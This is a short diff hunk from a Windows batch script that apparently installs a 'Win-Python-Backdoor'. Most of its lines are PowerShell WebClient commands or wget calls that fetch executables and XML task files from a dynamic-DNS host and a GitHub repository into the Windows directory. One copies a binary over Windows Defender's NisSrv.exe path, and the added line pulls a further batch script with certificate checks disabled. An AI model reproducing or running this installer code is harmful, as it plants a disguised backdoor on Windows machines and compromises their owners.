@@ -8,6 +8,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/cacert.pem','%windir%\cacert.pem')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/woffice.exe','%windir%\woffice.exe')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
+wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/get.bat  -O %windir%\get.bat
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/sys.xml  -O %windir%\sys.xml
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/syskill.xml  -O %windir%\syskill.xml
 wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/office_get.xml  -O %windir%\office_get.xml
